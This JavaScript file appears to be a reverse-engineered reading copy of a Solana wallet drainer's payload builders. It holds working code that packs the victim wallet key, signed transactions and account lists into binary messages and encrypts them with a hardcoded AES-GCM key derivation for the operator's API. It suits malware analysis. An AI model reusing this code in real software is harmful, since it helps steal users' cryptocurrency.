/**
 * Binary payload builders for the operator API.
 *
 * Original names: 焖 (process payload), 醭 (connect payload),
 * 措 (pack byte-array list), 詯 (encode account list), 箉/揲 (AES-GCM).
 * After string/constant substitution these are straight-line in the
 * bundle; this is the cleaned reading copy.
 *
 * Little helpers, for reference:
 *   踳(a, b)      random int in [a, b]            (Math.round(Math.random()*(b-a)+a))
 *   銇(buf,v,off) write u32 LE                    (4 bytes)
 *   暞(buf,v,off) write u16 LE                    (2 bytes)
 *   槐(buf,v,off) write u64 LE                    (8 bytes, BigInt)
 *   盇(buf,off,s) base58-decode s, write 32 bytes (軯/釨 = bs58 decode, "invalid bs58 char")
 *   樮/嵰(buf)    CRC32, poly 0xEDB88320          (init 0xFFFFFFFF, final ~)
 */

// 措: pack a list of byte arrays -> count byte, then per item a
// u16 LE length and the bytes. An empty list is a single zero byte.
function packByteArrays(list) {
  if (list.length === 0) return new Uint8Array(1);
  const total = list.reduce((acc, item) => acc + item.length, 0);
  const out = new Uint8Array(1 + list.length * 2 + total);
  out[0] = list.length;
  let offset = 1;
  for (const item of list) {
    writeU16(out, item.length, offset);
    offset += 2;
    out.set(item, offset);
    offset += item.length;
  }
  return out;
}

// 詯: encode the account list attached to a connect. One count byte,
// then per entry a type byte; type 0 adds a flag byte and two pubkeys
// (entry.J flag, entry.q, entry.de), type 2 adds one pubkey (entry.e).
function encodeAccounts(entries) {
  let size = 1;
  for (const entry of entries) {
    size += 1;
    if (entry.type === 0) size += 65;
    if (entry.type === 2) size += 32;
  }
  const out = new Uint8Array(size);
  let offset = 0;
  out[offset++] = entries.length;
  for (const entry of entries) {
    out[offset++] = entry.type;
    if (entry.type === 0) {
      out[offset++] = +entry.J;
      writePubkey(out, offset, entry.q);
      writePubkey(out, offset + 32, entry.de);
      offset += 64;
    }
    if (entry.type === 2) {
      writePubkey(out, offset, entry.e);
      offset += 32;
    }
  }
  return out;
}

const PROCESS_HEADER_SIZE = 52; // 緢: 13 + 4 + 32 + 1 + 2

// 焖: /process body. Carries the operator's attempt counter, the
// victim wallet, a flow byte, the signed transactions, and the
// accounts touched by them.
//
//   0..12   13 random bytes
//   13..16  u32 LE   attempt counter (global 屭.ne, 0 when unset)
//   17..48  32 bytes victim wallet pubkey (state.b.e)
//   49      1 byte   flow type (state.he.be)
//   50..51  u16 LE   byte length of the packed transaction section
//   52..    packByteArrays(signedTransactions)
//   ..      packByteArrays(accounts: state.he.Fe, type 0 -> .de else .e,
//                        each base58-decoded first)
function buildProcessPayload(victimPubkey, attemptCounter, signedTransactions, flowByte, accountAddresses) {
  const txSection = packByteArrays(signedTransactions);
  const accountSection = packByteArrays(accountAddresses.map(base58Decode));
  const out = new Uint8Array(PROCESS_HEADER_SIZE + txSection.length + accountSection.length);

  for (let i = 0; i < 13; i++) out[i] = randomInt(0, 255);
  let offset = 13;
  writeU32(out, attemptCounter, offset);
  offset += 4;
  writePubkey(out, offset, victimPubkey);
  offset += 32;
  out[offset++] = flowByte;
  writeU16(out, txSection.length, offset);
  offset += 2;
  out.set(txSection, offset);
  offset += txSection.length;
  out.set(accountSection, offset);
  return out;
}

const CONNECT_FIXED_SIZE = 59; // 绾: 15 + 8 + 32 + 4 (CRC)

// 醭: /c/i plaintext, encrypted before posting (see encryptForOperator).
//
//   0..14   15 random bytes
//   15..22  u64 LE   configured SOL amount in lamports (state.K, trunc)
//   23..54  32 bytes victim wallet pubkey
//   55..    encodeAccounts(state.he.lr)
//   last 4  CRC32 over everything before it
function buildConnectPayload(victimPubkey, solAmountLamports, accountEntries) {
  const accounts = encodeAccounts(accountEntries);
  const out = new Uint8Array(CONNECT_FIXED_SIZE + accounts.length);
  let offset = 0;
  for (; offset < 15; offset++) out[offset] = randomInt(0, 255);
  writeU64(out, BigInt(Math.trunc(solAmountLamports)), offset);
  offset += 8;
  writePubkey(out, offset, victimPubkey);
  offset += 32;
  out.set(accounts, offset);
  offset += accounts.length;
  const crc = crc32(out.subarray(0, -4));
  writeU32(out, crc, offset);
  return out;
}

// 揲: AES-GCM key for operator traffic. SHA-256 of
// (purpose string + salt), imported raw, cached in a Map (粈).
// Purposes seen: apiHost + "c" (/c/i) and apiHost + "log" (/api/handler).
const OPERATOR_KEY_SALT = "B3ui3QZFrOPoGW7oMZgE4A"; // 幦

async function operatorKey(purpose) {
  const digest = await crypto.subtle.digest(
    "SHA-256",
    new TextEncoder().encode(purpose + OPERATOR_KEY_SALT),
  );
  return crypto.subtle.importKey("raw", digest, { name: "AES-GCM" }, false, [
    "encrypt",
    "decrypt",
  ]);
}

// 箉: AES-GCM with a random 12-byte IV; output is iv || ciphertext.
async function encryptForOperator(plaintextBytes, purpose) {
  const key = await operatorKey(purpose);
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const ciphertext = await crypto.subtle.encrypt(
    { name: "AES-GCM", iv },
    key,
    plaintextBytes,
  );
  const out = new Uint8Array(iv.length + ciphertext.byteLength);
  out.set(iv, 0);
  out.set(new Uint8Array(ciphertext), iv.length);
  return out;
}

